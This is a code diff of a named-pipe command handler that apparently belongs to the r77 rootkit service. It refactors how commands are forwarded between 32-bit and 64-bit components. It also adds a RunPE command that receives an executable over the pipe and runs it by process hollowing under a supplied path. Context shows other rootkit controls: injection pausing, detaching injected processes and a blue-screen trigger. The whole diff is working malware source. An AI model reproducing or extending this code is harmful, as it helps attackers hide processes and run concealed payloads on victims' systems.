@@ -106,7 +106,7 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 		{
 			if (sizeof(LPVOID) == 4)
 			{
-				RedirectCommand64(&controlCode, sizeof(DWORD));
+				RedirectCommand64(controlCode, NULL, 0);
 			}
 
 			ExitProcess(0);
@@ -116,7 +116,7 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 		{
 			if (sizeof(LPVOID) == 4)
 			{
-				RedirectCommand64(&controlCode, sizeof(DWORD));
+				RedirectCommand64(controlCode, NULL, 0);
 			}
 
 			HKEY key;
@@ -135,7 +135,7 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 		{
 			if (sizeof(LPVOID) == 4)
 			{
-				RedirectCommand64(&controlCode, sizeof(DWORD));
+				RedirectCommand64(controlCode, NULL, 0);
 			}
 
 			IsInjectionPaused = TRUE;
@@ -145,7 +145,7 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 		{
 			if (sizeof(LPVOID) == 4)
 			{
-				RedirectCommand64(&controlCode, sizeof(DWORD));
+				RedirectCommand64(controlCode, NULL, 0);
 			}
 
 			IsInjectionPaused = FALSE;
@@ -168,8 +168,7 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 					}
 					else
 					{
-						DWORD data[] = { controlCode, processId };
-						RedirectCommand64(data, sizeof(data));
+						RedirectCommand64(controlCode, &processId, sizeof(DWORD));
 					}
 				}
 			}
@@ -180,7 +179,7 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 		{
 			if (sizeof(LPVOID) == 4)
 			{
-				RedirectCommand64(&controlCode, sizeof(DWORD));
+				RedirectCommand64(controlCode, NULL, 0);
 			}
 
 			LPDWORD processes = new DWORD[10000];
@@ -213,8 +212,7 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 					}
 					else
 					{
-						DWORD data[] = { controlCode, processId };
-						RedirectCommand64(data, sizeof(data));
+						RedirectCommand64(controlCode, &processId, sizeof(DWORD));
 					}
 				}
 			}
@@ -225,7 +223,7 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 		{
 			if (sizeof(LPVOID) == 4)
 			{
-				RedirectCommand64(&controlCode, sizeof(DWORD));
+				RedirectCommand64(controlCode, NULL, 0);
 			}
 
 			DetachAllInjectedProcesses();
@@ -243,6 +241,55 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 			}
 			break;
 		}
+		case CONTROL_USER_RUNPE:
+		{
+			WCHAR path[MAX_PATH + 1];
+			if (ReadFileStringW(pipe, path, MAX_PATH + 1))
+			{
+				DWORD fileSize;
+				DWORD bytesRead;
+				if (ReadFile(pipe, &fileSize, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
+				{
+					LPBYTE file = new BYTE[fileSize];
+					if (ReadFile(pipe, file, fileSize, &bytesRead, NULL) && bytesRead == fileSize)
+					{
+						BOOL is64Bit;
+						if (IsExecutable64Bit(file, &is64Bit))
+						{
+							if (is64Bit == (sizeof(LPVOID) == 8))
+							{
+								RunPE(path, file);
+							}
+							else
+							{
+								// RunPE executable does not match bitness of r77 service, needs to be redirected.
+
+								int pathSize = (lstrlenW(path) + 1) * sizeof(WCHAR);
+
+								DWORD redirectedDataSize =
+									pathSize +				// path
+									sizeof(DWORD) +			// file size
+									fileSize;				// file
+								LPBYTE redirectedData = new BYTE[redirectedDataSize];
+
+								DWORD offset = 0;
+								memcpy(redirectedData + offset, path, pathSize);
+								offset += pathSize;
+								memcpy(redirectedData + offset, &fileSize, sizeof(DWORD));
+								offset += sizeof(DWORD);
+								memcpy(redirectedData + offset, file, fileSize);
+
+								RedirectCommand64(controlCode, redirectedData, redirectedDataSize);
+								delete[] redirectedData;
+							}
+						}
+					}
+					delete[] file;
+				}
+			}
+
+			break;
+		}
 		case CONTROL_SYSTEM_BSOD:
 		{
 			BOOLEAN previousValue = FALSE;
@@ -256,13 +303,14 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 		}
 	}
 }
-VOID RedirectCommand64(LPVOID data, DWORD size)
+VOID RedirectCommand64(DWORD controlCode, LPVOID data, DWORD size)
 {
 	HANDLE pipe64 = CreateFileW(CONTROL_PIPE_REDIRECT64_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 	if (pipe64 != INVALID_HANDLE_VALUE)
 	{
 		DWORD bytesWritten;
-		WriteFile(pipe64, data, size, &bytesWritten, NULL);
+		WriteFile(pipe64, &controlCode, sizeof(DWORD), &bytesWritten, NULL);
+		if (data && size) WriteFile(pipe64, data, size, &bytesWritten, NULL);
 		CloseHandle(pipe64);
 	}
 }
